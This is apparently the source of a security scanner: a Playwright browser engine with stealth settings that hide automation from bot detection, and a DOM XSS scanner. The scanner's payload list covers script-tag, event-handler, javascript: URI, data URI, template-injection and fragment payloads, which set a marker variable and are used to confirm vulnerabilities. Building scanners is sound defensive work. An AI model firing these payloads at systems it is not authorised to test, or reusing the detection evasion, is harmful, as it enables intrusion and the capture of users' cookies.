"""
Browser engine using Playwright for JS-rendered scanning.
Production-grade: headless Chrome with stealth, evidence capture.
"""

from playwright.sync_api import sync_playwright, Page, Browser, BrowserContext
from pathlib import Path
import hashlib
import time
from typing import Optional
from dataclasses import dataclass

@dataclass
class BrowserEvidence:
    """Evidence captured from browser-based testing."""
    screenshot_path: str
    dom_snapshot: str
    console_logs: list[str]
    network_requests: list[dict]
    cookies: list[dict]
    local_storage: dict
    executed_payload: bool
    execution_context: str  # "inline", "event", "dom", "eval"

@dataclass 
class DOMXSSResult:
    """Result of DOM XSS testing."""
    vulnerable: bool
    confidence: str  # "confirmed" or "likely"
    payload: str
    execution_proof: str  # What exactly triggered
    evidence: BrowserEvidence


class BrowserEngine:
    """
    Headless browser for JS-rendered scanning.
    
    Features:
    - Stealth mode (evade bot detection)
    - Evidence capture (screenshots, DOM, console)
    - Multiple execution context detection
    - Session persistence
    """
    
    def __init__(
        self,
        headless: bool = True,
        timeout: int = 30000,
        evidence_dir: Path = Path("./evidence"),
    ):
        self.headless = headless
        self.timeout = timeout
        self.evidence_dir = Path(evidence_dir)
        self.evidence_dir.mkdir(parents=True, exist_ok=True)
        
        self._playwright = None
        self._browser: Optional[Browser] = None
        self._context: Optional[BrowserContext] = None
        self._console_logs: list[str] = []
        self._network_requests: list[dict] = []
    
    def __enter__(self):
        self.start()
        return self
    
    def __exit__(self, *args):
        self.stop()
    
    def start(self):
        """Initialize browser with stealth settings."""
        self._playwright = sync_playwright().start()
        
        self._browser = self._playwright.chromium.launch(
            headless=self.headless,
            args=[
                "--disable-blink-features=AutomationControlled",
                "--disable-dev-shm-usage",
                "--no-sandbox",
            ]
        )
        
        self._context = self._browser.new_context(
            viewport={"width": 1920, "height": 1080},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            java_script_enabled=True,
            ignore_https_errors=True,
        )
        
        # Stealth: Remove webdriver flag
        self._context.add_init_script("""
            Object.defineProperty(navigator, 'webdriver', {get: () => undefined});
            window.chrome = {runtime: {}};
        """)
    
    def stop(self):
        """Clean shutdown."""
        if self._context:
            self._context.close()
        if self._browser:
            self._browser.close()
        if self._playwright:
            self._playwright.stop()
    
    def new_page(self) -> Page:
        """Create new page with logging hooks."""
        page = self._context.new_page()
        
        # Capture console logs
        page.on("console", lambda msg: self._console_logs.append(
            f"[{msg.type}] {msg.text}"
        ))
        
        # Capture network requests
        page.on("request", lambda req: self._network_requests.append({
            "url": req.url,
            "method": req.method,
            "headers": dict(req.headers),
        }))
        
        return page
    
    def set_cookies(self, cookies: list[dict], domain: str):
        """Set session cookies for authenticated scanning."""
        if not self._context:
            return
            
        formatted_cookies = []
        for cookie in cookies:
            formatted_cookies.append({
                "name": cookie["name"],
                "value": cookie["value"],
                "domain": domain,
                "path": cookie.get("path", "/"),
            })
            
        if formatted_cookies:
            self._context.add_cookies(formatted_cookies)
    
    def capture_evidence(self, page: Page, name: str) -> BrowserEvidence:
        """Capture full evidence from current page state."""
        
        # Screenshot
        screenshot_path = self.evidence_dir / f"{name}_{int(time.time())}.png"
        page.screenshot(path=str(screenshot_path), full_page=True)
        
        # DOM snapshot
        dom_snapshot = page.content()
        
        # Cookies
        cookies = self._context.cookies() if self._context else []
        
        # LocalStorage
        try:
            local_storage = page.evaluate("() => Object.assign({}, window.localStorage)")
        except Exception:
            local_storage = {}
        
        return BrowserEvidence(
            screenshot_path=str(screenshot_path),
            dom_snapshot=dom_snapshot[:10000],  # Truncate for storage
            console_logs=self._console_logs.copy(),
            network_requests=self._network_requests.copy(),
            cookies=cookies,
            local_storage=local_storage,
            executed_payload=False,
            execution_context="",
        )


class DOMXSSScanner:
    """
    DOM XSS scanner with CONFIRMED execution detection.
    
    Tests multiple execution contexts:
    1. Inline script execution (<script>)
    2. Event handler execution (onerror, onload)
    3. DOM manipulation (innerHTML, document.write)
    4. eval/setTimeout/setInterval
    5. URL fragment (#) and search (?) based
    
    Only reports CONFIRMED if payload actually executes.
    """
    
    # Canary payloads with unique markers
    XSS_PAYLOADS = [
        # Script tag (tests innerHTML, document.write)
        {
            "payload": "<script>window.__SENSHI_XSS_CONFIRMED__='{marker}'</script>",
            "check": "window.__SENSHI_XSS_CONFIRMED__==='{marker}'",
            "context": "script_tag",
        },
        # Event handler - img onerror
        {
            "payload": "<img src=x onerror=\"window.__SENSHI_XSS_CONFIRMED__='{marker}'\">",
            "check": "window.__SENSHI_XSS_CONFIRMED__==='{marker}'",
            "context": "img_onerror",
        },
        # Event handler - svg onload
        {
            "payload": "<svg onload=\"window.__SENSHI_XSS_CONFIRMED__='{marker}'\">",
            "check": "window.__SENSHI_XSS_CONFIRMED__==='{marker}'",
            "context": "svg_onload",
        },
        # Event handler - body onload (rare but possible)
        {
            "payload": "<body onload=\"window.__SENSHI_XSS_CONFIRMED__='{marker}'\">",
            "check": "window.__SENSHI_XSS_CONFIRMED__==='{marker}'",
            "context": "body_onload",
        },
        # JavaScript URI
        {
            "payload": "javascript:window.__SENSHI_XSS_CONFIRMED__='{marker}'",
            "check": "window.__SENSHI_XSS_CONFIRMED__==='{marker}'",
            "context": "javascript_uri",
        },
        # Data URI with base64
        {
            "payload": "data:text/html,<script>parent.window.__SENSHI_XSS_CONFIRMED__='{marker}'</script>",
            "check": "window.__SENSHI_XSS_CONFIRMED__==='{marker}'",
            "context": "data_uri",
        },
        # Template literal injection (modern apps)
        {
            "payload": "${{constructor.constructor('window.__SENSHI_XSS_CONFIRMED__=\"{marker}\"')()}}",
            "check": "window.__SENSHI_XSS_CONFIRMED__==='{marker}'",
            "context": "template_literal",
        },
    ]
    
    def __init__(self, browser_engine: BrowserEngine):
        self.engine = browser_engine
    
    def scan_parameter(
        self,
        base_url: str,
        param_name: str,
        method: str = "GET",
    ) -> list[DOMXSSResult]:
        """
        Test a parameter for DOM XSS with execution confirmation.
        
        Returns only CONFIRMED vulnerabilities.
        """
        results = []
        
        for payload_config in self.XSS_PAYLOADS:
            # Generate unique marker for this test
            marker = hashlib.md5(f"{base_url}{param_name}{time.time()}".encode()).hexdigest()[:8]
            
            payload = payload_config["payload"].format(marker=marker)
            check_script = payload_config["check"].format(marker=marker)
            context = payload_config["context"]
            
            result = self._test_payload(
                base_url=base_url,
                param_name=param_name,
                payload=payload,
                check_script=check_script,
                context=context,
                marker=marker,
            )
            
            if result and result.vulnerable:
                results.append(result)
                # Found confirmed XSS, no need to test more payloads
                break
        
        return results
    
    def _test_payload(
        self,
        base_url: str,
        param_name: str,
        payload: str,
        check_script: str,
        context: str,
        marker: str,
    ) -> Optional[DOMXSSResult]:
        """Test single payload and check for execution."""
        
        from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
        
        # Build URL with payload
        parsed = urlparse(base_url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        page = self.engine.new_page()
        
        try:
            # Navigate to test URL
            page.goto(test_url, wait_until="networkidle", timeout=self.engine.timeout)
            
            # Wait a bit for any delayed JS execution
            page.wait_for_timeout(1000)
            
            # Check if payload executed
            try:
                executed = page.evaluate(check_script)
            except Exception:
                executed = False
            
            if executed:
                # CONFIRMED XSS - capture evidence
                evidence = self.engine.capture_evidence(
                    page, 
                    f"xss_{context}_{marker}"
                )
                evidence.executed_payload = True
                evidence.execution_context = context
                
                return DOMXSSResult(
                    vulnerable=True,
                    confidence="confirmed",
                    payload=payload,
                    execution_proof=f"window.__SENSHI_XSS_CONFIRMED__ set to '{marker}'",
                    evidence=evidence,
                )
            
            return None
            
        except Exception:
            # Don't report errors as findings
            return None
        finally:
            page.close()
    
    def scan_url_fragment(self, base_url: str) -> list[DOMXSSResult]:
        """
        Test URL fragment (#) for DOM XSS.
        Common in SPAs: location.hash used unsafely.
        """
        results = []
        
        # Fragment-based payloads
        fragment_payloads = [
            "<img src=x onerror=\"window.__SENSHI_XSS_CONFIRMED__='frag1'\">",
            "javascript:window.__SENSHI_XSS_CONFIRMED__='frag2'",
            "'-alert(1)-'",  # For eval(location.hash.slice(1))
        ]
        
        for payload in fragment_payloads:
            marker = hashlib.md5(f"{base_url}#{payload}".encode()).hexdigest()[:8]
            test_url = f"{base_url}#{payload}"
            
            page = self.engine.new_page()
            try:
                page.goto(test_url, wait_until="networkidle", timeout=self.engine.timeout)
                page.wait_for_timeout(1000)
                
                # Check for execution
                executed = page.evaluate("typeof window.__SENSHI_XSS_CONFIRMED__ !== 'undefined'")
                
                if executed:
                    evidence = self.engine.capture_evidence(page, f"xss_fragment_{marker}")
                    evidence.executed_payload = True
                    evidence.execution_context = "url_fragment"
                    
                    results.append(DOMXSSResult(
                        vulnerable=True,
                        confidence="confirmed",
                        payload=f"#{payload}",
                        execution_proof="Fragment-based DOM XSS executed",
                        evidence=evidence,
                    ))
                    break
                    
            except Exception:
                pass
            finally:
                page.close()
        
        return results
